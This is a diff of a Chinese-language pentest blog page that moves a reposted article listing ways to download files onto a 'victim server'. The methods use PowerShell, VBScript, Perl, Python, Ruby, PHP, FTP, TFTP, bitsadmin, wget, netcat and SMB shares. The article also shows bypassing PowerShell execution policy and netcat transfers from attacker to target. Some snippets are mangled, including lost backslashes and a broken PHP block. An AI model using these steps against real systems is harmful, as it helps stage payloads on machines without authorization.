+<h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
+<p>复制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
+<h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure>
+<h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://example.com/file</span><br></pre></td></tr></table></figure>
+<h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
+<p>target执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
+<p><strong>Netcat补充</strong>：</p>
+<p><code>传输文件</code></p>
+<p>方法一：</p>
+<p>接收端，先监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<p>传送端，发送</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<p>方法二：</p>
+<p>发送端，先监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
+<p>接收端，连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
+<p><code>传送目录</code></p>
+<p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
+<p>接收端，先监听并准备解压缩</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 | tar zxvf -</span><br></pre></td></tr></table></figure>
+<p>发送端，压缩并发送</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf - * | nc [ip] 3737</span><br></pre></td></tr></table></figure>
+<h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
+<h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
+<li><ol>
+<li>打开记事本</li>
+</ol>
+</li>
+<li><ol>
+<li>文件，打开</li>
+</ol>
+</li>
+<li><ol>
+<li>在文件名处填入下载地址</li>
+</ol>
+</li>
+</ul>
+<p><img src="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png" alt="1-1"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Linux 提权常用命令集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -942,160 +1180,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/Linux 提权常用命令集/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-十三种方式下载文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/" class="archive-article-date">
-  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
-<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
-<h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt"</span>)</span><br><span class="line">注意：下载的路径如果出现中文字的路径，可能会出错</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:&gt; .test.ps1</span><br></pre></td></tr></table></figure>
-<p>如果Powershell禁止执行了，使用如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;powershell <span class="built_in">set</span>-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>
-<p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
-<p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell executionpolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
-<p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\&gt; executionpolicy</span><br><span class="line">Bypass</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set args = Wscript.Arguments</span><br><span class="line">Url = <span class="string">"http://domain/file"</span></span><br><span class="line">dim xHttp: Set xHttp = createobject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">dim bStrm: Set bStrm = createobject(<span class="string">"Adodb.Stream"</span>)</span><br><span class="line">xHttp.Open <span class="string">"GET"</span>, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">    .<span class="built_in">type</span> = 1 <span class="string">'</span></span><br><span class="line"><span class="string">    .open</span></span><br><span class="line"><span class="string">    .write xHttp.responseBody</span></span><br><span class="line"><span class="string">    .savetofile " C:\%homepath%\file", 2 '</span></span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;cscript test.vbs</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl </span></span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(<span class="string">"http://domain/file"</span>, <span class="string">"file"</span>);</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># perl test.pl</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line">import urllib2 </span><br><span class="line">u = urllib2.urlopen(<span class="string">'http://domain/file'</span>) </span><br><span class="line">localFile = open(<span class="string">'local_file'</span>, <span class="string">'w'</span>) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python test.py</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line">require <span class="string">'net/http'</span></span><br><span class="line">Net::HTTP.start(<span class="string">"www.domain.com"</span>) &#123; |http|</span><br><span class="line">r = http.get(<span class="string">"/file"</span>)</span><br><span class="line">open(<span class="string">"save_location"</span>, <span class="string">"wb"</span>) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ruby test.rb</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/php </span></span><br><span class="line"><span class="string">"http://example.com/file"</span>);</span><br><span class="line"><span class="variable">$lf</span> = <span class="string">"local_file"</span>;         </span><br><span class="line"><span class="variable">$fh</span> = fopen(<span class="variable">$lf</span>, <span class="string">'w'</span>);         </span><br><span class="line">fwrite(<span class="variable">$fh</span>, <span class="variable">$data</span>[0]);         </span><br><span class="line">fclose(<span class="variable">$fh</span>); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># php test.php</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
-<p>复制</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
-<h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure>
-<h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://example.com/file</span><br></pre></td></tr></table></figure>
-<h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file | nc -l 1234</span><br></pre></td></tr></table></figure>
-<p>target执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc host_ip 1234 &gt; file</span><br></pre></td></tr></table></figure>
-<p><strong>Netcat补充</strong>：</p>
-<p><code>传输文件</code></p>
-<p>方法一：</p>
-<p>接收端，先监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
-<p>传送端，发送</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
-<p>方法二：</p>
-<p>发送端，先监听</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 &lt; test.txt</span><br></pre></td></tr></table></figure>
-<p>接收端，连接</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] 3737 &gt; test.txt</span><br></pre></td></tr></table></figure>
-<p><code>传送目录</code></p>
-<p>传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名</p>
-<p>接收端，先监听并准备解压缩</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 3737 | tar zxvf -</span><br></pre></td></tr></table></figure>
-<p>发送端，压缩并发送</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf - * | nc [ip] 3737</span><br></pre></td></tr></table></figure>
-<h2 id="0x12-Window-文件共享"><a href="#0x12-Window-文件共享" class="headerlink" title="0x12 Window 文件共享"></a>0x12 Window 文件共享</h2><p>使用如下命令:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \127.0.0.1\share /user:example.comuserID myPassword</span><br></pre></td></tr></table></figure>
-<h2 id="0x13-记事本："><a href="#0x13-记事本：" class="headerlink" title="0x13 记事本："></a>0x13 记事本：</h2><ul>
-<li><ol>
-<li>打开记事本</li>
-</ol>
-</li>
-<li><ol>
-<li>文件，打开</li>
-</ol>
-</li>
-<li><ol>
-<li>在文件名处填入下载地址</li>
-</ol>
-</li>
-</ul>
-<p><img src="https://evi1cg.github.io/usr/uploads/2015/12/1319444800.png" alt="1-1"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">展开全文 >></a>
         </p>
       
 
